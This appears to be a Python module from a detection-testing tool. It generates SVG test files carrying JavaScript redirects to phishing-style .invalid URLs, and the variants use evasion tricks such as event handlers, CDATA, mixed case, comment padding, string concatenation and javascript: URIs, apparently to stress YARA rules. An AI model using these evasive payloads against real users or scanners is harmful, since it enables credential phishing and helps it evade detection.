"""Craftsman Agent 2c: Structural & payload mutator for active-content SVG files."""

from __future__ import annotations

import uuid
from typing import List

from ..models import Variant
from .base import BaseCraftsman


class SvgCraftsman(BaseCraftsman):
    """Generates synthetic SVG variants along structural, script-execution, and encoding axes."""

    def generate_variants(self, cycle: int, feedback: List[str] | None = None) -> List[Variant]:
        variants: List[Variant] = []

        if cycle == 1:
            # Cycle 1: Baseline and structural variations
            variants.append(
                Variant(
                    id=f"svg-{uuid.uuid4().hex[:8]}",
                    target_type="yara",
                    axis="structural",
                    mutation_name="svg_baseline_script_redirect",
                    description="Standard script block with window.location.href redirection",
                    payload=(
                        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n'
                        '  <script type="text/javascript">\n'
                        '    window.location.href = "https://secure.login.invalid/auth";\n'
                        '  </script>\n'
                        '  <circle cx="50" cy="50" r="40" fill="red"/>\n'
                        '</svg>'
                    ),
                    cycle=cycle,
                )
            )
            variants.append(
                Variant(
                    id=f"svg-{uuid.uuid4().hex[:8]}",
                    target_type="yara",
                    axis="syntax",
                    mutation_name="svg_onload_event_handler",
                    description="Redirection via onload event handler instead of explicit <script> tag",
                    payload=(
                        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" '
                        'onload="location.assign(\'https://sso.portal.invalid/session\')">\n'
                        '  <rect width="100" height="100" fill="blue"/>\n'
                        '</svg>'
                    ),
                    cycle=cycle,
                )
            )
            variants.append(
                Variant(
                    id=f"svg-{uuid.uuid4().hex[:8]}",
                    target_type="yara",
                    axis="structural",
                    mutation_name="svg_cdata_encapsulation",
                    description="Script body wrapped inside CDATA section",
                    payload=(
                        '<svg xmlns="http://www.w3.org/2000/svg">\n'
                        '  <script><![CDATA[\n'
                        '    window.location.replace("https://account-verify.invalid/step1");\n'
                        '  ]]></script>\n'
                        '  <text x="10" y="20">Loading...</text>\n'
                        '</svg>'
                    ),
                    cycle=cycle,
                )
            )
            variants.append(
                Variant(
                    id=f"svg-{uuid.uuid4().hex[:8]}",
                    target_type="yara",
                    axis="obfuscation",
                    mutation_name="svg_mixed_case_markup",
                    description="Mixed case XML tags and JavaScript primitives",
                    payload=(
                        '<sVg xmlns="http://www.w3.org/2000/svg">\n'
                        '  <sCrIpT>\n'
                        '    WINDOW.LOCATION.HREF = "https://update-notice.invalid/dl";\n'
                        '  </sCrIpT>\n'
                        '</sVg>'
                    ),
                    cycle=cycle,
                )
            )

        elif cycle == 2:
            # Cycle 2: Boundary testing — pushing the 1 KB root threshold and navigation primitives
            variants.append(
                Variant(
                    id=f"svg-{uuid.uuid4().hex[:8]}",
                    target_type="yara",
                    axis="structural",
                    mutation_name="svg_comment_padding_exceeding_1kb",
                    description="Prepends 1,200 bytes of benign XML comments before <svg> root",
                    payload=(
                        '<?xml version="1.0" encoding="UTF-8"?>\n'
                        f'<!-- {"A" * 1200} -->\n'
                        '<svg xmlns="http://www.w3.org/2000/svg">\n'
                        '  <script>window.location.href = "https://boundary-test.invalid";</script>\n'
                        '</svg>'
                    ),
                    cycle=cycle,
                )
            )
            variants.append(
                Variant(
                    id=f"svg-{uuid.uuid4().hex[:8]}",
                    target_type="yara",
                    axis="obfuscation",
                    mutation_name="svg_string_concatenation_location",
                    description="Obfuscates location object via bracket property access and concatenation",
                    payload=(
                        '<svg xmlns="http://www.w3.org/2000/svg">\n'
                        '  <script>\n'
                        '    var dest = "https://" + "cdn-gate" + ".invalid/token";\n'
                        '    window["loc" + "ation"]["hr" + "ef"] = dest;\n'
                        '  </script>\n'
                        '</svg>'
                    ),
                    cycle=cycle,
                )
            )
            variants.append(
                Variant(
                    id=f"svg-{uuid.uuid4().hex[:8]}",
                    target_type="yara",
                    axis="syntax",
                    mutation_name="svg_onerror_event_redirect",
                    description="Execution triggered via image onerror handler with location.replace",
                    payload=(
                        '<svg xmlns="http://www.w3.org/2000/svg">\n'
                        '  <image href="missing.invalid" '
                        'onerror="window.location.replace(\'https://error-redirect.invalid\')"/>\n'
                        '</svg>'
                    ),
                    cycle=cycle,
                )
            )

        else:
            # Cycle 3: Protocol handlers and anchor interaction
            variants.append(
                Variant(
                    id=f"svg-{uuid.uuid4().hex[:8]}",
                    target_type="yara",
                    axis="syntax",
                    mutation_name="svg_anchor_javascript_uri",
                    description="Anchor tag executing JavaScript navigation via javascript: URI",
                    payload=(
                        '<svg xmlns="http://www.w3.org/2000/svg">\n'
                        '  <a href="javascript:location.assign(\'https://uri-nav.invalid\')">\n'
                        '    <text x="10" y="20">Click here to view document</text>\n'
                        '  </a>\n'
                        '</svg>'
                    ),
                    cycle=cycle,
                )
            )
            variants.append(
                Variant(
                    id=f"svg-{uuid.uuid4().hex[:8]}",
                    target_type="yara",
                    axis="structural",
                    mutation_name="svg_namespace_prefix_aliasing",
                    description="SVG elements defined with custom namespace prefix",
                    payload=(
                        '<svg:svg xmlns:svg="http://www.w3.org/2000/svg">\n'
                        '  <svg:script>window.location.href = "https://ns-prefix.invalid";</svg:script>\n'
                        '</svg:svg>'
                    ),
                    cycle=cycle,
                )
            )

        return variants
